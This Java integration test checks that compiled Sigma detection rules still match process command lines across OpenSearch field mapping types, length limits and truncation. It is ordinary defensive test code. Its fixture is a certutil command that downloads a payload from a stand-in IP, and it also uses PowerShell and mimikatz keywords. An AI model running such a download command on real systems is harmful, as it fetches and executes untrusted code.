/*
 * Copyright (C) 2026, Wazuh Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
package org.opensearch.securityanalytics.rules.backend;

import org.opensearch.client.Request;
import org.opensearch.client.Response;
import org.opensearch.securityanalytics.SecurityAnalyticsRestTestCase;
import org.opensearch.securityanalytics.config.monitors.DetectorMonitorConfig;
import org.opensearch.securityanalytics.rules.objects.SigmaRule;
import org.opensearch.securityanalytics.util.RuleTopicIndices;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Locale;
import java.util.Map;

/**
 * Runs a compiled Sigma rule against a real percolator, once per string type the WCS can emit.
 *
 * <p>This exists because a mapping change that silently disabled detection passed every test in
 * this repository. Moving the unbounded string fields (process.command_line, url.*, message) off
 * {@code keyword} to escape {@code ignore_above: 1024} made every {@code |contains} selection on
 * them match nothing, and nothing noticed: a mapping type is not right or wrong on its own, only
 * against the query shapes it has to answer, and only once a query actually runs. So every
 * assertion here is on a percolation result, never on a mapping or a setting.
 *
 * <p>Each case is built out of production code end to end:
 *
 * <ul>
 *   <li>the query comes from {@link OSQueryBackend#convertRule}, so it is exactly the string a
 *       detector stores;
 *   <li>the index settings come from {@link RuleTopicIndices#ruleTopicIndexSettings()}, the same
 *       analysis chains the query index template carries;
 *   <li>the field mapping is the source type plus whatever {@link
 *       DetectorMonitorConfig#getRuleIndexMappingsByType()} overlays onto it, which is what {@code
 *       DocLevelMonitorQueries} and {@code LogtestQueryIndex} each do to build their own copy.
 * </ul>
 *
 * <p>Drop the overlay for a type, or map a rule-matched field as a type with no overlay, and the
 * cases here fail. That is the whole point.
 */
public class QueryIndexFieldTypeIT extends SecurityAnalyticsRestTestCase {

    /** Every string type the WCS generator can emit for a rule-matched field. */
    private static final List<String> STRING_TYPES = List.of("keyword", "match_only_text", "text");

    /** The percolator field, named as the detector query index and the logtest index both name it. */
    private static final String PERCOLATOR_FIELD = "query";

    /** A field carrying real {@code |contains} selections: 72 of them in the shipped catalogue. */
    private static final String FIELD = "process.command_line";

    private static final String COMMAND_LINE =
            "certutil.exe -urlcache -split -f http://198.51.100.9/payload.exe";

    /**
     * A value whose only character needing care is the space the {@code _ws_} placeholder stands for.
     */
    private static final String SPACED_COMMAND_LINE = "powershell Invoke WebRequest";

    /**
     * {@code |contains} on a single word, the commonest selection shape.
     *
     * <p>The compiled query is {@code process.command_line: *urlcache*}, and {@code query_string}
     * routes a wildcard term through {@code normalizedWildcardQuery}, so how the field is indexed
     * decides whether this can match at all.
     */
    public void testContainsMatchesEveryStringType() throws Exception {
        String query = compile(FIELD + "|contains: \"urlcache\"");
        assertEquals(FIELD + ": *urlcache*", query);

        for (String type : STRING_TYPES) {
            assertEquals(
                    "a |contains selection must match a " + type + " field, and matched nothing",
                    1L,
                    percolate(type, query, COMMAND_LINE));
        }
    }

    /**
     * {@code |contains} on a value holding a space.
     *
     * <p>For a wildcard value {@code SigmaString.convert} escapes the space instead of using the
     * {@code _ws_} placeholder, so the pattern reaching the field has a literal space in it. Only a
     * whole-value token can hold one, which is what {@code rule_analyzer} (tokenizer: keyword) and
     * {@code rule_ws_normalizer} each guarantee; under the standard analyzer no token ever contains a
     * space and the match is lost.
     */
    public void testContainsWithASpaceMatchesEveryStringType() throws Exception {
        String query = compile(FIELD + "|contains: \"Invoke WebRequest\"");
        assertTrue(
                "a wildcard value escapes its spaces: " + query, query.contains("Invoke\\ WebRequest"));

        for (String type : STRING_TYPES) {
            assertEquals(
                    "a |contains value with a space must match a " + type + " field",
                    1L,
                    percolate(type, query, SPACED_COMMAND_LINE));
        }
    }

    /**
     * An exact selection holding a space, the shape the {@code _ws_} placeholder exists for.
     *
     * <p>This is the other half of the matrix, and the one the earlier keyword fix was about: a
     * quoted value goes through analysis, so the chain has to turn {@code _ws_} back into a space and
     * still leave the value whole.
     */
    public void testExactValueWithASpaceMatchesEveryStringType() throws Exception {
        String query = compile(FIELD + ": \"" + SPACED_COMMAND_LINE + "\"");
        assertEquals(FIELD + ": \"" + SPACED_COMMAND_LINE.replace(" ", "_ws_") + "\"", query);

        for (String type : STRING_TYPES) {
            assertEquals(
                    "an exact value with spaces must match a " + type + " field",
                    1L,
                    percolate(type, query, SPACED_COMMAND_LINE));
        }
    }

    /**
     * The reason the WCS moved these fields off {@code keyword} in the first place.
     *
     * <p>A {@code keyword} field declares {@code ignore_above: 1024}, so a longer command line is
     * kept in {@code _source} and never indexed: no rule can match it and nothing reports a failure.
     * {@code match_only_text} has no such ceiling. Both halves are asserted because the contrast is
     * the justification for the mapping change, and would otherwise be untested.
     */
    public void testOnlyMatchOnlyTextSurvivesPastTheKeywordLengthCeiling() throws Exception {
        String query = compile(FIELD + "|contains: \"payload.exe\"");
        String longCommandLine = "cmd.exe /c " + "A".repeat(2000) + " " + COMMAND_LINE;

        assertEquals(
                "a command line past ignore_above is not indexed as keyword, so no rule can match it",
                0L,
                percolate("keyword", query, longCommandLine));
        assertEquals(
                "match_only_text has no length ceiling, which is why the WCS adopted it",
                1L,
                percolate("match_only_text", query, longCommandLine));
    }

    /**
     * A value too long for one Lucene term must not fail the percolate search of its batch.
     *
     * <p>{@code rule_analyzer} keeps a {@code text} or {@code match_only_text} value whole, and
     * Lucene refuses a term over 32766 bytes. Without a bound, one such document made the percolate
     * search fail for every document percolated with it, and the detector gave up the whole batch.
     * Several documents are percolated in one search here because that is what a detector does.
     */
    public void testAValueTooLongForOneTermDoesNotFailTheBatch() throws Exception {
        String query = compile(FIELD + "|contains: \"urlcache\"");

        for (String type : STRING_TYPES) {
            assertEquals(
                    "the " + type + " batch must be evaluated despite its 40000-character value",
                    List.of(1),
                    percolateBatch(type, query, List.of("A".repeat(40000), COMMAND_LINE)));
        }
    }

    /**
     * The bound holds for multibyte values too, including one truncated inside a surrogate pair.
     *
     * <p>The truncation counts UTF-16 code units, and Lucene counts UTF-8 bytes. The euro sign takes
     * 3 bytes, the most any code unit takes, so it reaches the limit exactly. An emoji is a surrogate
     * pair of 4 bytes, and the leading {@code a} makes the cut fall between its two halves.
     */
    public void testAMultibyteValueStaysWithinTheTermLimit() throws Exception {
        String query = compile(FIELD + "|contains: \"urlcache\"");
        String emoji = new String(Character.toChars(0x1F600));
        List<String> values =
                List.of("€".repeat(20000), emoji.repeat(20000), "a" + emoji.repeat(20000), COMMAND_LINE);

        for (String type : List.of("match_only_text", "text")) {
            assertEquals(
                    "the " + type + " batch must be evaluated despite its multibyte values",
                    List.of(3),
                    percolateBatch(type, query, values));
        }
    }

    /**
     * The cost of the bound: a rule only sees the start of a very long value.
     *
     * <p>The value is truncated, not dropped, so a match within the first characters is still found.
     * Past them it is not, as with {@code ignore_above} before, which dropped the whole value. This
     * pins the trade-off so that changing it is a decision.
     */
    public void testOnlyTheStartOfAVeryLongValueIsMatched() throws Exception {
        String query = compile(FIELD + "|contains: \"urlcache\"");
        String padding = "A".repeat(40000);

        assertEquals(
                "a match at the start of a long value is found, one past the limit is not",
                List.of(0),
                percolateBatch(
                        "match_only_text",
                        query,
                        List.of(COMMAND_LINE + " " + padding, padding + " " + COMMAND_LINE)));
    }

    /**
     * A negative control, so the assertions above cannot pass vacuously.
     *
     * <p>Every failure this test guards against looks like "the percolator returned nothing". If a
     * broken index or an unparsed query made every case return nothing, the positive assertions would
     * catch it; if a change made everything match, this one does.
     */
    public void testAValueTheRuleDoesNotSelectMatchesNothing() throws Exception {
        String query = compile(FIELD + "|contains: \"mimikatz\"");

        for (String type : STRING_TYPES) {
            assertEquals(
                    "an unrelated command line must not match a " + type + " field",
                    0L,
                    percolate(type, query, COMMAND_LINE));
        }
    }

    /**
     * Compiles a one-selection Sigma rule the way a detector does.
     *
     * @param selection the {@code field: value} line of the rule's {@code sel} block.
     * @return the query string the detector would store.
     */
    private String compile(String selection) throws Exception {
        String rule =
                "title: Query index field type\n"
                        + "id: 5f0a8f33-0f6e-4a27-bd3a-2a7a2f1f6e21\n"
                        + "status: test\n"
                        + "level: high\n"
                        + "description: One selection, compiled the way a detector compiles it\n"
                        + "author: Wazuh\n"
                        + "date: 2026/01/01\n"
                        + "logsource:\n"
                        + "    category: process_creation\n"
                        + "    product: windows\n"
                        + "detection:\n"
                        + "    sel:\n"
                        + "        "
                        + selection
                        + "\n"
                        + "    condition: sel";

        List<Object> queries =
                new OSQueryBackend(Map.of(), true).convertRule(SigmaRule.fromYaml(rule, false));
        return queries.get(0).toString();
    }

    /**
     * Stores the compiled query in a percolator index built like a query index, then percolates one
     * document against it.
     *
     * @param type the source field's mapping type, before the analysis overlay.
     * @param query the compiled query string.
     * @param value the value of {@link #FIELD} in the percolated document.
     * @return how many stored queries the document satisfied: 1 when the rule matches, 0 when not.
     */
    private long percolate(String type, String query, String value) throws IOException {
        return percolateBatch(type, query, List.of(value)).size();
    }

    /**
     * Percolates several documents in one search, as a detector percolates a batch.
     *
     * @param type the source field's mapping type, before the analysis overlay.
     * @param query the compiled query string.
     * @param values the value of {@link #FIELD} in each percolated document.
     * @return the positions in {@code values} of the documents the rule matched, in order.
     */
    @SuppressWarnings("unchecked")
    private List<Integer> percolateBatch(String type, String query, List<String> values)
            throws IOException {
        String index =
                String.format(
                        Locale.ROOT,
                        "query-index-field-type-%s-%s",
                        type.replace('_', '-'),
                        randomAlphaOfLength(6).toLowerCase(Locale.ROOT));
        createQueryIndex(index, type);
        storeQuery(index, query);

        StringBuilder documents = new StringBuilder();
        for (String value : values) {
            documents.append(documents.length() == 0 ? "" : ",");
            documents.append("{\"process\":{\"command_line\":").append(quote(value)).append("}}");
        }
        Request search = new Request("GET", "/" + index + "/_search");
        search.setJsonEntity(
                "{\"query\":{\"percolate\":{\"field\":\""
                        + PERCOLATOR_FIELD
                        + "\",\"documents\":["
                        + documents
                        + "]}}}");
        Response response = client().performRequest(search);

        Map<String, Object> hits = (Map<String, Object>) entityAsMap(response).get("hits");
        List<Map<String, Object>> matched = (List<Map<String, Object>>) hits.get("hits");
        List<Integer> slots = new ArrayList<>();
        for (Map<String, Object> hit : matched) {
            Map<String, Object> fields = (Map<String, Object>) hit.get("fields");
            for (Object slot : (List<Object>) fields.get("_percolator_document_slot")) {
                slots.add(((Number) slot).intValue());
            }
        }
        Collections.sort(slots);
        logger.info("[{}] query [{}] matched documents {} of {}", type, query, slots, values.size());
        return slots;
    }

    /**
     * Creates an index shaped like the query index a detector percolates against: the rule analysis
     * settings, the percolator field, and {@link #FIELD} mapped as {@code type} with that type's
     * overlay merged in.
     *
     * @param index the index to create.
     * @param type the source field's mapping type.
     */
    private void createQueryIndex(String index, String type) throws IOException {
        StringBuilder field = new StringBuilder("{\"type\":\"" + type + "\"");
        if ("keyword".equals(type)) {
            // What the WCS emits for a bounded string field, and the ceiling that started all this.
            field.append(",\"ignore_above\":1024");
        }
        // Deliberately not asserted: a type with no overlay is mapped bare, exactly as the query
        // index would map it, so the failure this test reports is the silent zero-match a detector
        // would suffer rather than a missing map entry. RuleTopicIndicesTests covers the map itself.
        Map<String, String> overlay =
                DetectorMonitorConfig.getRuleIndexMappingsByType().getOrDefault(type, Map.of());
        overlay.forEach((key, val) -> field.append(",\"").append(key).append("\":").append(quote(val)));
        field.append("}");

        Request create = new Request("PUT", "/" + index);
        create.setJsonEntity(
                "{\"settings\":"
                        + RuleTopicIndices.ruleTopicIndexSettings()
                        + ",\"mappings\":{\"properties\":{\""
                        + PERCOLATOR_FIELD
                        + "\":{\"type\":\"percolator\"},\"process\":{\"properties\":{\"command_line\":"
                        + field
                        + "}}}}}");
        client().performRequest(create);
    }

    /**
     * Stores one compiled query as a percolator document, in the shape {@code DocLevelMonitorQueries}
     * writes it.
     *
     * @param index the percolator index.
     * @param query the compiled query string.
     */
    private void storeQuery(String index, String query) throws IOException {
        Request store = new Request("POST", "/" + index + "/_doc");
        store.addParameter("refresh", "true");
        store.setJsonEntity(
                "{\""
                        + PERCOLATOR_FIELD
                        + "\":{\"query_string\":{\"query\":"
                        + quote(query)
                        + ",\"fields\":[]}}}");
        client().performRequest(store);
    }

    /**
     * JSON-quotes a value, which matters here because compiled queries carry backslashes.
     *
     * @param value the raw string.
     * @return the value as a JSON string literal.
     */
    private static String quote(String value) {
        return "\"" + value.replace("\\", "\\\\").replace("\"", "\\\"") + "\"";
    }
}
